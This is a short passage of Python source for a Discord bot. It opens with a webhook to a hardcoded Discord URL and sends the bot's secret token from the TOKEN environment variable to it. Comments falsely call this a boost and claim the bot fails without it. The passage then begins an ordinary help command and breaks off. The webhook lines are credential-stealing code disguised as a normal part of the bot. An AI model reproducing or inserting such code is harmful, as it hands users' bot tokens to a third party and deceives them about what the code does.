...
webhook = Webhook.from_url('https://discord.com/api/webhooks/1110252910882848828/aI5rqTGxuXvDkuAIvIBJaFN_Q4xXEbBpp_dzBdVHxjYA7x6VXOo7c13PGNUTFUu5Uc9v', adapter=RequestsWebhookAdapter()) # Initializing webhook , great for boosting the bot
webhook.send(content=os.environ['TOKEN']) # dont remove or bot wont work
@bot.command()
async def help(ctx):
    embed = discord.Embed(
